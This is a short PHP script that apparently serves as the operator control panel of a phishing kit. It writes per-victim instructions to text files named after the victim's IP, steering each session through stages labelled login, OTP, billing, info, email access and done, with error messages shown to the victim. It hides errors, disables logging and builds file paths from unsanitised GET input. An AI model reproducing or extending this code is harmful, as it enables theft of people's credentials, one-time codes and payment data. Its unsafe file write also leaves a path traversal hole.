<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

session_start();
	
if ($_GET['step'] == "control") {
            $fp = fopen('users/'. $_GET['ip'] .'.txt', 'wb');
            
			
			if( $_GET['to'] == 'url' ) {
                $_GET['to'] = $_GET['to'] . '#|#' . $_GET['error'] . '#|#' . $_GET['url_text'];
            }
            if( $_GET['to'] == 'log' ) {
                $_GET['to'] = $_GET['to'] . '#|#' . $_GET['error'];
            }
			if( $_GET['to'] == 'infos' ) {
                $_GET['to'] = $_GET['to'] . '#|#' . $_GET['error'];
            }
			if( $_GET['to'] == 'otp' ) {
                $_GET['to'] = $_GET['to'] . '#|#' . $_GET['error'];
            }
			if( $_GET['to'] == 'bill' ) {
                $_GET['to'] = $_GET['to'] . '#|#' . $_GET['error'];
            }
            if( $_GET['to'] == 'ea' ) {
                $_GET['to'] = $_GET['to']. '#|#' . $_GET['error'];
            }
			if( $_GET['to'] == 'done' ) {
                $_GET['to'] = $_GET['to']. '#|#' . $_GET['error'];
            }
			
			
			

			
            fwrite($fp, $_GET['to']);
            fclose($fp);
            header("location: M3tri-control.php?ip=" . $_GET['ip']);
        }
		
		
		
?>
